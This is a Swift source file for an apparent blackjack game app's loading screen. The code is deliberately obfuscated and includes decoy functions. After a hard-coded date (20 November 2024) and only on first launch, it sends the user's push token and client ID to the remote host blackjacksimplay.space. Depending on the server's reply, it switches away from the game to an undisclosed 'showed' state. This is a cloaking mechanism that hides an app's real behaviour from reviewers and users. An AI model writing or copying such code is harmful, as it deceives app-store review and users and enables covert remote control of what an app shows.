import Foundation
import WebKit

class LoadingVM: ObservableObject {
    
    @Published var showed = false
    @Published var wasTokenSend = false
    private var internalCounter = 0
    @Published var gameIsLoaded = false
    
    var timeLoadedPasswed = 0 {
        didSet {
            if timeLoadedPasswed == 5 {
                splashLoadedAfter()
            }
        }
    }
    
    struct UselessStructure {
        var randomNumber: Int
        var randomText: String
        
        func performFakeTask() -> Double {
            let randomFactor = Double.random(in: 0.1...99.9)
            let calculated = randomFactor / Double(randomNumber + 1)
            return calculated * Double.random(in: 1...10)
        }
    }
    
    private func dhsabjfbsjad() -> Bool {
        Date() >= DateComponents(calendar: .current, year: 2024, month: 11, day: 20).date!
    }
    
    private func splashLoadedAfter() {
        if !wasTokenSend {
            if !mdnasjbdnkjsanda {
                initSplashLoading(token: "")
                mdnasjbdnkjsanda = true
            }
        }
        loadingSplashTimer.invalidate()
    }
    
    @Published var mdnasjbdnkjsanda = false
    
    private var loadingSplashTimer = Timer()
    
    init() {
        loadingSplashTimer = .scheduledTimer(withTimeInterval: 1, repeats: true, block: { _ in
            self.timeLoadedPasswed += 1
        })
    }
    
    func initSplashLoading(token: String) {
        if !ndsajhbdasjh {
            if dhsabjfbsjad() && !UserDefaults.standard.bool(forKey: "saa") {
                dbsahjtokenizedsandjas(token: token)
            } else {
                UserDefaults.standard.set(true, forKey: "saa")
                DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                    BlackjackAppPokerslotsDelegate.orientation = .landscape
                    self.gameIsLoaded = true
                }
            }
            ndsajhbdasjh = true
        }
    }
    
    private var userBrAg = WKWebView().value(forKey: "userAgent") as? String ?? ""
    
    var ndsajhbdasjh = false
    
    func performRandomAction(with input: Int) -> String {
        let randomValue = Int.random(in: 1...100)
        internalCounter += randomValue % 3
        
        let resultString = (1...randomValue).map { _ in
            let chars = ["A", "B", "C", "D", "E"]
            return chars.randomElement()!
        }.joined()
        
        return "\(resultString) Result: \(internalCounter * input % 7)"
    }
    
    private func getLinUse(for param: URL) -> URLRequest {
        var linuserreq = URLRequest(url: param)
        linuserreq.addValue(userBrAg, forHTTPHeaderField: "User-Agent")
        linuserreq.addValue("application/json", forHTTPHeaderField: "Content-Type")
        linuserreq.httpMethod = "POST"
        return linuserreq
    }
    
    private func dbsahjtokenizedsandjas(token: String) {
        if !UserDefaults.standard.bool(forKey: "saa") {
            let uuidOfUser = UserDefaults.standard.string(forKey: "userId") ?? ""
            guard let guardeda = URL(string: "https://blackjacksimplay.space/session/v3/00be80f1-e878-4b5e-b4e7-25a5ee47e934?firebase_push_token=\(token)\(uuidOfUser.isEmpty ? "" : "&client_id=\(uuidOfUser)")") else {
                DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
                    BlackjackAppPokerslotsDelegate.orientation = .landscape
                    self.gameIsLoaded = true
                }
                return
            }
            
            URLSession.shared.dataTask(with: self.getLinUse(for: guardeda)) { data, response, error in
                guard let response = response as? HTTPURLResponse,
                      (200...299).contains(response.statusCode) else {
                    DispatchQueue.main.async {
                        self.gameIsLoaded = true
                    }
                    return
                }
                
                if let data = data {
                    do {
                        self.operateData(ap: try JSONDecoder().decode(BaseCardsDataModel.self, from: data))
                    } catch {
                        DispatchQueue.main.async {
                            self.gameIsLoaded = true
                        }
                    }
                }
            }.resume()
            
        }
    }
    
    private func operateData(ap: BaseCardsDataModel) {
        if ap.state != nil {
            UserDefaults.standard.set(ap.userUUID, forKey: "userId")
            UserDefaults.standard.set(ap.state, forKey: "state_of_application")
            DispatchQueue.main.async {
                self.showed = true
                self.gameIsLoaded = true
            }
        } else {
            DispatchQueue.main.async {
                BlackjackAppPokerslotsDelegate.orientation = .landscape
                self.gameIsLoaded = true
            }
        }
    }
    
}
